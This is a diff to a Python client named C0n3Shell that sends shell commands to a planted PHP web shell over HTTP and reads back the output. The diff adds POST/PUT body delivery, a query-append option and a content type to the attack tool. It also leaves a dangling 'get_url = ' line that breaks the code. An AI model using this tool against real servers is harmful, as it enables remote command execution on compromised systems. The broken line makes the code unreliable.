@@ -25,11 +25,13 @@ class C0n3Shell(Cmd):
         'http_verb': 'get',
         'url': 'http://localhost/shell.php',
         'attribute': 'cmd',
-        'raw': False,
-        'show_stderr': True,
+        'raw': True,
+        'show_stderr': False,
         'pwd': '',
         'marker': '[c3n0]',
-        'ignore_certs': True
+        'ignore_certs': True,
+        'append':False,
+        'content_type': 'application/x-www-form-urlencoded'
     }
 
     def __init__(
@@ -56,7 +58,7 @@ class C0n3Shell(Cmd):
         self.banner()
         Cmd.__init__(self)
         self.showOptions(None)
-        self.getPwd()
+        # self.getPwd()
 
     def default(self, args):
         self.cmdHandler(args)
@@ -94,11 +96,13 @@ class C0n3Shell(Cmd):
                 payload = 'echo \'{}\';{};echo \'{}\''.format(self._options['marker'], payload, self._options['marker'])
 
             print('[!] Sending payload: {}'.format(payload))
+
+            get_url = 
             response = requests.request(
                 self._options['http_verb'],
-                '{}?{}={}'.format(self._options['url'], self._options['attribute'], quote(payload)),
+                '{}{}{}={}'.format(self._options['url'],'&' if self._options['append'] else '?' ,self._options['attribute'], quote(payload)) if self._options['http_verb'] not in ['post','put'] else self._options['url'],
                 headers=self._headers,
-                data=self._data if self._options['http_verb'] in ['post,put'] else None
+                data=payload if self._options['http_verb'] in ['post','put'] else None
             )
 
             if response.status_code == 200:
